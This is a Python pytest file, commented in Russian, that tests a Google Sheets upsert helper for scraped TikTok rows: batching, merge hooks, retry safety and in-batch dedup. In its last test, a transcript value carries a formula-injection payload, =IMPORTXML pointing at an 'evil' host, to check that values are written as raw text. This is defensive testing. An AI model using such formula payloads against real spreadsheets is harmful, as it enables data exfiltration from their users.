# C1.3 — Sheets.upsert_rows: read keys -> батч-update существующих + append новых
# (в gspread нативного upsert нет). merge-hook подключает coalesce P1.16.
import pytest

from cf.collect.coalesce import coalesce_row
from cf.sheets import Sheets, UnknownFieldsError

from tests.fakes import FakeClient, FakeSheets, FakeWorksheet

CFG = {
    "spreadsheet_id": "x",
    "service_account_file": "unused",
    "tabs": {"raw_tiktok": "CF Raw TikTok"},
}

HEADERS = ["raw_id", "views", "transcript_text", "source_query", "collected_at"]


def make_sheets(ws):
    return Sheets(config=CFG, client=FakeClient({"CF Raw TikTok": ws}), retry_delay=0)


def row(raw_id, views, transcript="", query="hashtag:#a", collected="2026-07-23T08:00:00.000Z"):
    return {"raw_id": raw_id, "views": views, "transcript_text": transcript,
            "source_query": query, "collected_at": collected}


def test_upsert_updates_and_appends_batched():
    ws = FakeWorksheet(HEADERS, [
        ["tiktok_1", 100, "старый текст", "hashtag:#x", "2026-07-01T00:00:00.000Z"],
        ["tiktok_2", 200, "", "query:y", "2026-07-01T00:00:00.000Z"],
    ])
    s = make_sheets(ws)
    result = s.upsert_rows("raw_tiktok", "raw_id", [
        row("tiktok_1", 5000),
        row("tiktok_2", 6000),
        row("tiktok_3", 300),
        row("tiktok_4", 400),
        row("tiktok_5", 500),
    ])
    assert result["updated"] == 2
    assert result["appended"] == 3
    # 2 существующих + 3 новых = 1 чтение + 1 батч-update + 1 append
    assert ws.get_all_records_calls == 1
    assert ws.batch_update_calls == 1
    assert ws.append_rows_calls == 1
    assert len(ws.rows) == 5
    assert ws.rows[0][1] == "5000"


def test_upsert_merge_hook_coalesces():
    ws = FakeWorksheet(HEADERS, [
        ["tiktok_1", 100, "готовый транскрипт", "hashtag:#x", "2026-07-01T00:00:00.000Z"],
    ])
    s = make_sheets(ws)
    s.upsert_rows("raw_tiktok", "raw_id",
                  [row("tiktok_1", 5000, transcript="", query="snowball:s",
                       collected="2026-07-23T08:00:00.000Z")],
                  merge=coalesce_row)
    # coalesce: transcript/source_query/collected_at прежние, метрика свежая
    assert ws.rows[0][1] == "5000"
    assert ws.rows[0][2] == "готовый транскрипт"
    assert ws.rows[0][3] == "hashtag:#x"
    assert ws.rows[0][4] == "2026-07-01T00:00:00.000Z"


def test_upsert_retry_after_append_write_does_not_duplicate():
    # Сбой ПОСЛЕ приземления append_rows: ретрай перечитывает лист, видит строку
    # существующей и уходит в update-ветку — дубля нет (аналог P1.5 для upsert).
    ws = FakeWorksheet(HEADERS, [], fail_after_append_rows=1)
    s = make_sheets(ws)
    result = s.upsert_rows("raw_tiktok", "raw_id", [row("tiktok_9", 900)])
    assert len([r for r in ws.rows if r and r[0] == "tiktok_9"]) == 1
    assert result["updated"] + result["appended"] == 1


def test_upsert_missing_key_column_raises():
    ws = FakeWorksheet(["other"], [])
    s = make_sheets(ws)
    with pytest.raises(UnknownFieldsError):
        s.upsert_rows("raw_tiktok", "raw_id", [{"raw_id": "x", "other": 1}])


def test_upsert_empty_rows_no_http():
    ws = FakeWorksheet(HEADERS, [])
    s = make_sheets(ws)
    assert s.upsert_rows("raw_tiktok", "raw_id", []) == {"updated": 0, "appended": 0}
    assert ws.get_all_records_calls == 0


def test_upsert_last_row_wins_on_duplicate_key():
    # Дубль ключа в листе: обновляется ПОСЛЕДНЯЯ строка (парность с appendOrUpdate
    # n8n и indexByRawId — последняя побеждает).
    ws = FakeWorksheet(HEADERS, [
        ["tiktok_1", 1, "", "", ""],
        ["tiktok_1", 2, "", "", ""],
    ])
    s = make_sheets(ws)
    s.upsert_rows("raw_tiktok", "raw_id", [row("tiktok_1", 999)])
    assert ws.rows[0][1] == 1        # первая не тронута
    assert ws.rows[1][1] == "999"    # последняя обновлена


def test_fake_sheets_upsert_behaves_like_real():
    fake = FakeSheets(tables={"raw_tiktok": [
        {"raw_id": "tiktok_1", "views": 100, "transcript_text": "готовый",
         "source_query": "hashtag:#x", "collected_at": "2026-07-01"},
    ]})
    result = fake.upsert_rows("raw_tiktok", "raw_id", [
        row("tiktok_1", 5000, transcript="", query="snowball:s"),
        row("tiktok_2", 200),
    ], merge=coalesce_row)
    assert result == {"updated": 1, "appended": 1}
    rows = fake.tables["raw_tiktok"]
    assert rows[0]["views"] == 5000
    assert rows[0]["transcript_text"] == "готовый"
    assert rows[0]["source_query"] == "hashtag:#x"
    assert rows[1]["raw_id"] == "tiktok_2"


# ── Аудит 2026-07-24 (H12/M33, H17): внутрибатчевый дедуп и RAW ───────────────

def test_upsert_two_new_rows_same_key_single_append():
    ws = FakeWorksheet(HEADERS, [])
    s = make_sheets(ws)
    result = s.upsert_rows("raw_tiktok", "raw_id", [
        row("tiktok_9", 100, transcript="первый"),
        row("tiktok_9", 250, transcript=""),
    ])
    assert result["appended"] == 1                 # одна строка, не две
    assert len(ws.rows) == 1
    assert ws.rows[0][1] == "250"                  # overlay: поздний ряд обновляет


def test_upsert_in_batch_duplicate_uses_merge_hook():
    ws = FakeWorksheet(HEADERS, [])
    s = make_sheets(ws)
    s.upsert_rows("raw_tiktok", "raw_id", [
        row("tiktok_9", 100, transcript="готовый транскрипт"),
        row("tiktok_9", 250, transcript=""),
    ], merge=coalesce_row)
    assert len(ws.rows) == 1
    rec = dict(zip(HEADERS, ws.rows[0]))
    assert rec["views"] == "250"                   # метрики свежие
    assert rec["transcript_text"] == "готовый транскрипт"   # coalesce сохранил текст


def test_upsert_in_batch_duplicate_after_existing_hit_merges_updated_values():
    ws = FakeWorksheet(HEADERS, [
        ["tiktok_1", 100, "старый", "hashtag:#x", "2026-07-01T00:00:00.000Z"],
    ])
    s = make_sheets(ws)
    result = s.upsert_rows("raw_tiktok", "raw_id", [
        row("tiktok_1", 5000, transcript="новый"),
        row("tiktok_1", 7000, transcript=""),
    ], merge=coalesce_row)
    assert result["appended"] == 0
    assert result["updated"] == 2                  # оба апдейта одной строки
    rec = dict(zip(HEADERS, ws.rows[0]))
    assert rec["views"] == "7000"
    assert rec["transcript_text"] == "новый"       # merge видел УЖЕ обновлённый текст


def test_upsert_batch_update_uses_raw_input_option():
    # H17: caption/transcript контролирует автор ролика — '=IMPORTXML(...)' обязан
    # лечь текстом, а не исполниться формулой при повторном сборе того же raw_id.
    ws = FakeWorksheet(HEADERS, [
        ["tiktok_1", 100, "x", "hashtag:#x", "2026-07-01T00:00:00.000Z"],
    ])
    s = make_sheets(ws)
    s.upsert_rows("raw_tiktok", "raw_id",
                  [row("tiktok_1", 200, transcript='=IMPORTXML("http://evil";"//x")')])
    assert str(ws.last_batch_update_option).lower().endswith("raw")
